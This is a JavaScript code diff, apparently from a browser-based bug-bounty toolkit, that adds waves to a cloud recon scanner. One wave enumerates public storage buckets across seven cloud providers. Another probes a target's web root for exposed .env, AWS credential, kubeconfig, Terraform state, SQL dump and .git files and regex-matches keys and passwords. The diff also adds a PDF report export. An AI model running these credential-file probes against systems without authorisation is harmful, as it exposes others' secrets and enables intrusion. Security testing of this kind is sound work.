+  nbLog('═══ OLEADA 9/11: MULTI-CLOUD ENUM — DO Spaces + OCI (sa-santiago-1) + Alibaba OSS + Wasabi + Linode + Scaleway + IBM COS ═══', 'section');
+  var cands = nbBucketCandidates(dom).slice(0, 45);
+  var jobs = [];
+  cands.forEach(function(c){
+    jobs.push({ u:'https://' + c + '.nyc3.digitaloceanspaces.com/', k:'DO' });
+    jobs.push({ u:'https://' + c + '.ams3.digitaloceanspaces.com/', k:'DO' });
+    jobs.push({ u:'https://' + c + '.objectstorage.sa-santiago-1.oraclecloud.com/', k:'OCI' });
+    jobs.push({ u:'https://' + c + '.objectstorage.us-ashburn-1.oraclecloud.com/', k:'OCI' });
+    jobs.push({ u:'https://' + c + '.oss-us-west-1.aliyuncs.com/', k:'Alibaba' });
+    jobs.push({ u:'https://s3.us-east-2.wasabisys.com/' + c, k:'Wasabi' });
+    jobs.push({ u:'https://' + c + '.us-east-1.linodeobjects.com/', k:'Linode' });
+    jobs.push({ u:'https://' + c + '.s3.fr-par.scw.cloud/', k:'Scaleway' });
+    jobs.push({ u:'https://s3.us.cloud-object-storage.appdomain.cloud/' + c, k:'IBM' });
+  });
+  nbTotal += jobs.length;
+  return nbPool(jobs, 12, function(j){
+    return nbP(j.u).then(function(res){
+      nbDone++; nbProg();
+      if(!res || !res.status) return;
+      var body = (res.body || '').slice(0, 2500);
+      var host = j.u.split('/')[2];
+      if(/ListBucketResult|EnumerationResults|ListObjectsResult|<Contents>|<Blobs>/i.test(body)){
+        var keys = (body.match(/<Key>|<Name>/g) || []).length;
+        nbHit('MULTI-CLOUD PUBLIC BUCKET (' + j.k + ')', host + ' — LISTABLE (' + keys + ' objetos)');
+        nbRow('9', 'MultiCloud', host, res.status, 'PUBLIC CRIT — listable');
+      } else if(res.status === 403){
+        nbRow('9', 'MultiCloud', host, 403, 'existe — privado (' + j.k + ')');
+      }
+    });
+  }).then(function(){
+    nbLog('Multi-cloud enum completo: ' + jobs.length + ' probes (7 providers)', 'dim');
+  });
+}
+
+/* ═══ OLEADA 10: CLOUD CREDS LEAK HUNT — archivos de credenciales en el target ═══ */
+function nbWaveCredsHunt(origin){
+  nbLog('═══ OLEADA 10/11: CLOUD CREDS LEAK HUNT — .env / serviceAccount / tfstate / dumps en el target ═══', 'section');
+  var paths = [
+    ['/.env', 'dotenv'], ['/.env.production', 'dotenv'], ['/.env.local', 'dotenv'], ['/.env.backup', 'dotenv'], ['/.env.dev', 'dotenv'], ['/.env.staging', 'dotenv'],
+    ['/config.json', 'config'], ['/config.yml', 'config'], ['/config.yaml', 'config'], ['/settings.json', 'config'], ['/appsettings.json', 'config'],
+    ['/firebase.json', 'firebase'], ['/.firebaserc', 'firebase'], ['/google-services.json', 'firebase'],
+    ['/serviceAccount.json', 'svcacct'], ['/service-account.json', 'svcacct'], ['/serviceaccount.json', 'svcacct'],
+    ['/.aws/credentials', 'awscreds'], ['/.aws/config', 'awscreds'], ['/credentials.json', 'awscreds'], ['/cloud-credentials.json', 'awscreds'],
+    ['/.docker/config.json', 'docker'], ['/docker-compose.yml', 'docker'], ['/docker-compose.yaml', 'docker'],
+    ['/kubeconfig', 'k8s'], ['/kubernetes.yml', 'k8s'], ['/secrets.yaml', 'k8s'], ['/.kube/config', 'k8s'],
+    ['/backup.sql', 'dump'], ['/db.sql', 'dump'], ['/dump.sql', 'dump'], ['/db-backup.sql', 'dump'], ['/backup.sql.gz', 'dump'], ['/database.sql', 'dump'],
+    ['/terraform.tfstate', 'tfstate'], ['/.terraform/terraform.tfstate', 'tfstate'], ['/terraform.tfvars', 'tfstate'],
+    ['/.git/config', 'git'], ['/.git/HEAD', 'git'],
+    ['/storage.json', 'storage'], ['/secrets.json', 'secrets'], ['/secret.json', 'secrets']
+  ];
+  nbTotal += paths.length;
+  return nbPool(paths, 10, function(p){
+    return nbP(origin + p[0]).then(function(res){
+      nbDone++; nbProg();
+      if(!res || res.status !== 200 || !res.body) return;
+      var body = res.body.slice(0, 4000);
+      if(body.length < 8) return;
+      var soft = /<title>[^<]*(404|not found|no encontrado)|<html[^>]*>\s*<head/i.test(body.slice(0, 400)) && !/API_KEY|SECRET|password|token/i.test(body);
+      if(soft) return;
+      if(/(aws_access_key_id|AKIA[0-9A-Z]{16}|aws_secret_access_key)/i.test(body)){
+        nbHit('AWS CREDS LEAKED', p[0] + ' — credenciales AWS en texto plano');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — AWS creds expuestas');
+      } else if(/("type"\s*:\s*"service_account")|(private_key)/i.test(body)){
+        nbHit('SERVICE ACCOUNT LEAKED', p[0] + ' — clave privada de service account expuesta');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — service account');
+      } else if(/BEGIN (RSA|EC|OPENSSH|PGP) PRIVATE KEY/i.test(body)){
+        nbHit('PRIVATE KEY LEAKED', p[0] + ' — private key expuesta en texto plano');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — private key');
+      } else if(/(api[_-]?key|apiKey)\s*[:=]\s*['"][A-Za-z0-9_\-]{20,}/i.test(body)){
+        nbHit('API KEY LEAKED', p[0] + ' — API key hardcodeada en config expuesto');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — API key');
+      } else if(/(password|passwd|secret)\s*[:=]\s*['"][^'"]{4,}/i.test(body)){
+        nbHit('PASSWORD LEAKED', p[0] + ' — password en archivo de config');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — password');
+      } else if(/(databaseURL|projectId|firebase)/i.test(body) && p[1] === 'firebase'){
+        nbHit('FIREBASE CONFIG LEAKED', p[0] + ' — configuración Firebase expuesta');
+        nbRow('10', 'CredsHunt', p[0], 200, 'VULN — firebase config');
+      } else if(/(INSERT INTO|CREATE TABLE|DROP TABLE)/i.test(body)){
+        nbHit('SQL DUMP LEAKED', p[0] + ' — dump SQL descargable sin auth');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — dump SQL');
+      } else if(/("resource"|terraform|tfvars)/i.test(body) && p[1] === 'tfstate'){
+        nbHit('TERRAFORM STATE LEAKED', p[0] + ' — estado Terraform con infra + secrets');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — tfstate');
+      } else if(/(\[remote "origin"\]|ref: refs\/|\[core\])/i.test(body)){
+        nbHit('GIT CONFIG EXPUESTO', p[0] + ' — .git accesible (repo filtrado)');
+        nbRow('10', 'CredsHunt', p[0], 200, 'VULN — .git expuesto');
+      } else if(/(auths|"auth"|registry)/i.test(body) && p[1] === 'docker'){
+        nbHit('DOCKER CREDS LEAKED', p[0] + ' — config de registry con credenciales');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — registry creds');
+      } else if(/(private_keys|users|admin)/i.test(body) && p[1] === 'k8s'){
+        nbHit('K8S SECRETS LEAKED', p[0] + ' — secrets del cluster expuestos');
+        nbRow('10', 'CredsHunt', p[0], 200, 'CRIT — k8s secrets');
+      }
+    });
+  }).then(function(){
+    nbLog('Creds hunt completo: ' + paths.length + ' archivos sensibles probados', 'dim');
+  });
+}
+
+/* ═══ OLEADA 11: TAKEOVER + REPORTE ═══ */
 function nbWaveReport(dom, origin){
-  nbLog('═══ OLEADA 9/9: TAKEOVER FINAL + REPORTE ═══', 'section');
+  nbLog('═══ OLEADA 11/11: TAKEOVER FINAL + REPORTE ═══', 'section');
   var tk = 0;
   nbDeadBuckets.forEach(function(b){
     nbHit('TAKEOVER CANDIDATE', b + ' — bucket 404 referenciado en assets del target: registrable por atacante');
@@ -26117,9 +26426,9 @@ function nbWaveReport(dom, origin){
   });
   tk += nbCnameTakeovers.length;
   var report = {
-    tool:'NIMBUS Cloud Reaper v2.0 ULTRA', target: dom, origin: origin,
+    tool:'NIMBUS Cloud Reaper v3.0 REAPER XTREME', target: dom, origin: origin,
     date: new Date().toISOString(),
-    waves: 9,
+    waves: 11,
     cloud_assets: nbCloudAssets,
     takeover_candidates: nbDeadBuckets,
     cname_takeovers: nbCnameTakeovers,
@@ -26134,7 +26443,9 @@ function nbWaveReport(dom, origin){
       '<div class="nb-stat"><b>' + nbFindings.length + '</b><span>hallazgos</span></div>' +
       '<div class="nb-stat hit"><b>' + cnt.crit + '</b><span>críticos</span></div>' +
       '<div class="nb-stat"><b>' + tk + '</b><span>takeover</span></div>' +
-      '<button id="nbExport" class="nb-export">⬇ EXPORT JSON</button>';
+      '<div class="nb-stat"><b>' + nbTotal + '</b><span>probes</span></div>' +
+      '<button id="nbExport" class="nb-export">⬇ EXPORT JSON</button>' +
+      '<button id="nbExportPdf" class="nb-export" style="margin-left:8px;background:#00ffa3;color:#000">⬇ EXPORT PDF</button>';
     var ex = document.getElementById('nbExport');
     if(ex) ex.addEventListener('click', function(){
       var blob = new Blob([JSON.stringify(report, null, 2)], { type:'application/json' });
@@ -26143,6 +26454,59 @@ function nbWaveReport(dom, origin){
       a.download = 'nimbus-' + dom + '.json';
       a.click();
       setTimeout(function(){ URL.revokeObjectURL(a.href); }, 4000);
+    });
+    /* ═══ EXPORT PDF (sesión #21): reporte print-ready — window.print() del browser
+       lo guarda como PDF. Cero dependencias externas, cero <script> en la ventana
+       (onload en <body>), cierre del style seguro (solo la secuencia cruda de cierre de script rompe el bloque). ═══ */
+    var px = document.getElementById('nbExportPdf');
+    if(px) px.addEventListener('click', function(){
+      var w = window.open('', '_blank');
+      if(!w){ nbLog('[!] El navegador bloqueó la ventana del PDF — permití pop-ups y reintentá', 'warn'); return; }
+      function pdfEsc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+      var critRe = /PUBLIC|VULN|EXPUESTO|CRIT|TAKEOVER|CREDS/i;
+      var fRows = nbFindings.map(function(f, i){
+        return '<tr class="' + (critRe.test(f.category + ' ' + f.detail) ? 'crit' : '') + '"><td>' + (i+1) + '</td><td>' + pdfEsc(f.category) + '</td><td>' + pdfEsc(f.detail) + '</td></tr>';
+      }).join('');
+      var tkRows = nbDeadBuckets.map(function(b){ return '<li>' + pdfEsc(b) + '</li>'; }).join('');
+      var cnRows = nbCnameTakeovers.map(function(c){ return '<li>' + pdfEsc(c) + '</li>'; }).join('');
+      var probeRows = (nbBodyEl && nbBodyEl.innerHTML) ? nbBodyEl.innerHTML : '';
+      var fecha = new Date().toLocaleString();
+      w.document.write(
+        '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">' +
+        '<title>TudelaSec — Nimbus Cloud Reaper — ' + dom + '</title>' +
+        '<style>' +
+        'body{font-family:Consolas,"Courier New",monospace;color:#101010;background:#fff;margin:24px;font-size:12px;}' +
+        'h1{font-size:19px;margin:0 0 2px;color:#ff1a2e;letter-spacing:1px;}' +
+        '.sub{color:#555;font-size:11px;margin-bottom:14px;}' +
+        '.stats{width:100%;border-collapse:collapse;margin-bottom:16px;}' +
+        '.stats td{border:1px solid #ddd;padding:8px 14px;font-size:12px;}' +
+        '.stats b{font-size:17px;display:block;color:#ff1a2e;}' +
+        '.stats span{font-size:9px;text-transform:uppercase;letter-spacing:1px;color:#666;}' +
+        'h2{font-size:13px;border-bottom:2px solid #ff1a2e;padding-bottom:3px;margin:20px 0 8px;}' +
+        'table.rep{width:100%;border-collapse:collapse;font-size:10.5px;}' +
+        'table.rep th{background:#f3eef0;border:1px solid #ddd;padding:5px 8px;text-align:left;}' +
+        'table.rep td{border:1px solid #e5e0e2;padding:5px 8px;vertical-align:top;word-break:break-all;}' +
+        'tr.crit td{background:#ffe3e7;color:#c4001a;font-weight:bold;}' +
+        'ul{margin:4px 0 0 18px;padding:0;}li{margin-bottom:3px;word-break:break-all;}' +
+        '.foot{margin-top:22px;border-top:1px solid #ccc;padding-top:8px;color:#777;font-size:10px;}' +
+        '</style></head><body onload="window.print()">' +
+        '<h1>⚡ TUDELASEC — NIMBUS CLOUD REAPER v3.0 REAPER XTREME</h1>' +
+        '<div class="sub">Cloud Attack Surface Report · target: ' + pdfEsc(dom) + ' · ' + pdfEsc(origin) + ' · generado: ' + fecha + '</div>' +
+        '<table class="stats"><tr>' +
+        '<td><b>' + nbCloudAssets.length + '</b><span>assets cloud</span></td>' +
+        '<td><b>' + nbFindings.length + '</b><span>hallazgos</span></td>' +
+        '<td><b>' + cnt.crit + '</b><span>críticos</span></td>' +
+        '<td><b>' + tk + '</b><span>takeover candidates</span></td>' +
+        '</tr></table>' +
+        '<h2>HALLAZGOS</h2>' +
+        (fRows ? '<table class="rep"><tr><th>#</th><th>CATEGORÍA</th><th>DETALLE</th></tr>' + fRows + '</table>' : '<div>Sin hallazgos.</div>') +
+        (tkRows ? '<h2>TAKEOVER CANDIDATES (buckets muertos)</h2><ul>' + tkRows + '</ul>' : '') +
+        (cnRows ? '<h2>CNAME TAKEOVERS</h2><ul>' + cnRows + '</ul>' : '') +
+        '<h2>LOG COMPLETO DE PROBES</h2>' +
+        '<table class="rep">' + probeRows + '</table>' +
+        '<div class="foot">TudelaSec — Matías Ramírez Tudela · Ethical Hacker & Bug Bounty Hunter · Reporte generado localmente por NIMBUS Cloud Reaper. Solo para uso en targets autorizados (bug bounty activos).</div>' +
+        '</body></html>');
+      w.document.close();
     });
   }
   nbLog('═══ NIMBUS COMPLETO: ' + nbFindings.length + ' hallazgos (' + cnt.crit + ' críticos) · ' + nbCloudAssets.length + ' assets · ' + tk + ' takeoverables ═══', cnt.crit ? 'hit' : 'ok');
@@ -26164,7 +26528,7 @@ function nbRun(){
   nbRunBtn.disabled = true; nbRunBtn.textContent = '🌩 CAZANDO...';
   nbProg();
 
-  nbLog('🌩 NIMBUS CLOUD REAPER v2.0 ULTRA — target: ' + dom, 'section');
+  nbLog('🌩 NIMBUS CLOUD REAPER v3.0 REAPER XTREME — target: ' + dom, 'section');
   nbLog('Proxy: ' + NB_PROXY, 'dim');
 
   nbWaveRecon(origin)
@@ -26175,6 +26539,8 @@ function nbRun(){
     .then(function(){ return nbWaveMetadata(origin); })
     .then(function(){ return nbWaveK8s(origin); })
     .then(function(){ return nbWaveCname(dom); })
+    .then(function(){ return nbWaveMultiCloud(dom); })
+    .then(function(){ return nbWaveCredsHunt(origin); })
     .then(function(){ return nbWaveReport(dom, origin); })
     .catch(function(e){ nbLog('[x] Error en oleada: ' + (e && e.message || e), 'warn'); })
     .then(function(){
@@ -26216,7 +26582,7 @@ else { var bb = $('nbRun'); if(bb) bb.addEventListener('click', nbRun); }
 var TR = {};
 
 function trDollar(id){ try{ return document.getElementById(id) || null; }catch(e){ return null; } }
-var trCode = trDollar('trCode'), trRun = trDollar('trRun'), trLog = trDollar('trLog'),
+var trCode = trDollar('trCode'), trRunBtn = trDollar('trRun'), trLog = trDollar('trLog'),
     trBody = trDollar('trBody'), trFill = trDollar('trFill'), trSummary = trDollar('trSummary'),
     trSample = trDollar('trSample'), trRowEl = trDollar('trBody');
 
@@ -26496,7 +26862,7 @@ function trRun(){
   if (!trLog) return;
   trLog.innerHTML = '';
   if (trBody) trBody.innerHTML = '';
-  if (trRun && trRun.disabled !== undefined){ trRun.disabled = true; trRun.textContent = '🧿 AUDITANDO...'; }
+  if (trRunBtn && trRunBtn.disabled !== undefined){ trRunBtn.disabled = true; trRunBtn.textContent = '🧿 AUDITANDO...'; }
   trProg(8);
   trLogEl('═══ TAINT RADAR v2.0 — POLÍTICA KERNEL/PARANOIDE · TOLERANCIA CERO ═══', 'tr-sep');
   trLogEl('// motor v2.0 — 31 fuentes × 36 sumideros · interprocedural de IDA y RETORNO · prototype pollution · Trusted Types · mXSS re-serialización · DOMPurify config-attack · scoring PARANOIDE', 't');
@@ -26552,7 +26918,7 @@ function trRun(){
       }catch(e){ trLogEl('[x] Export falló: ' + (e && e.message || e), 'warn'); }
     });
   }
-  if (trRun && trRun.disabled !== undefined){ trRun.disabled = false; trRun.textContent = '🧿 AUDITAR (ZERO TRUST)'; }
+  if (trRunBtn && trRunBtn.disabled !== undefined){ trRunBtn.disabled = false; trRunBtn.textContent = '🧿 AUDITAR (ZERO TRUST)'; }
 }
 
 var TR_SAMPLE = [
